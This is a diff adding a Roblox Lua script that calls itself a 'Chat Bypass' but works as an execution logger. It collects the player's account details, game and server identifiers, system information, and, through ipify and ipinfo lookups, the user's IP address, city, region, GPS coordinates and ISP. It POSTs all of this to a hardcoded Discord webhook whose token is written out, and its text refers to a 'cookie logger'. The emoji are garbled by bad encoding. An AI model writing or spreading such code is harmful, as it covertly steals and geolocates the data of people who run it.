@@ -1,0 +1,70 @@
+getgenv().whscript = "Chat Bypass"
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1279336507705917502/TJIbidpdDflVZNcw5JOoRsQHGBWBJONfqXWz0QccjCvvc15gyEUbLjOintipJEVvXoUR" -- not getting my webhook
+getgenv().ExecLogSecret = true
+
+local ui = gethui()
+local folderName = "screen"
+local folder = Instance.new("Folder")
+folder.Name = folderName
+folder.Parent = ui
+
+local player = game:GetService("Players").LocalPlayer
+local players = game:GetService("Players")
+local userid = player.UserId
+local gameid = game.PlaceId
+local jobid = tostring(game.JobId)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC �뮲" or "Mobile �벑"
+local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+local completeTime = os.date("%Y-%m-%d %H:%M:%S")
+local workspace = game:GetService("Workspace")
+local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
+local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
+local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
+local playerCount = #players:GetPlayers()
+local maxPlayers = players.MaxPlayers
+local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
+local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
+local gameVersion = game.PlaceVersion
+local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
+
+local function checkPremium()
+    local success, response = pcall(function() return player.MembershipType end)
+    return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
+end
+
+local url = getgenv().webhookexecUrl
+local data = {
+    ["content"] = "@everyone",
+    ["content_2"] = true,
+    ["embeds"] = {{
+        ["title"] = "MADE BY DXFC | �� **Script Execution Detected | Exec Log**",
+        ["description"] = "*�� One of the Script's has been Executed.(�뜧COOKIE LOGGER IS PATCHED FOR NOW!):*",
+        ["type"] = "rich",
+        ["color"] = tonumber(0xe67e22),
+        ["fields"] = {
+            {["name"] = "�뵇 **Script Info**", ["value"] = "```�뮲 Script Name: " .. getgenv().whscript .. "\n�� Executed At: " .. completeTime .. "```", ["inline"] = false},
+            {["name"] = "�뫀 **Player Details**", ["value"] = "```�㎏ Username: " .. player.Name .. "\n�뱷 Display Name: " .. player.DisplayName .. "\n�넄 UserID: " .. userid .. "\n�ㅿ툘 Health: " .. health .. " / " .. maxHealth .. "\n�뵕 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
+            {["name"] = "�뱟 **Account Information**", ["value"] = "```�뿎截� Account Age: " .. player.AccountAge .. " days\n�뭿 Premium Status: " .. checkPremium() .. "\n�뱟 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
+            {["name"] = "�렜 **Game Details**", ["value"] = "```�뤇截� Game Name: " .. gameName .. "\n�넄 Game ID: " .. gameid .. "\n�뵕 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n�뵢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
+            {["name"] = "�빘截� **Server Info**", ["value"] = "```�뫁 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n�븩 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
+            {["name"] = "�뱻 **Network Info**", ["value"] = "```�벛 Ping: " .. pingValue .. " ms```", ["inline"] = true},
+            {["name"] = "�뼢截� **System Info**", ["value"] = "```�벟 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n�뵇 Memory Usage: " .. memoryUsage .. " MB\n�숋툘 Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
+            {["name"] = "�뱧 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
+            {["name"] = "�ぇ **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
+        },
+        ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"},
+        ["footer"] = {["text"] = "Made by dxfc with �ㅿ툘 | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&"}
+    }}
+}
+
+if getgenv().ExecLogSecret then
+    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. game:HttpGet("https://api.ipify.org") .. "/json"))
+    table.insert(data.embeds[1].fields, {["name"] = "**`(�ㄻ) Secret`**", ["value"] = "||(�몿) IP Address: " .. ipinfo_table.ip .. "||\n||(�뙀) Country: " .. ipinfo_table.country .. "||\n||(�첒) GPS Location: " .. ipinfo_table.loc .. "||\n||(�룞截�) City: " .. ipinfo_table.city .. "||\n||(�룪) Region: " .. ipinfo_table.region .. "||\n||(�あ) Hoster: " .. ipinfo_table.org .. "||"})
+end
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {["content-type"] = "application/json"}
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+request({Url = url, Body = newdata, Method = "POST", Headers = headers})
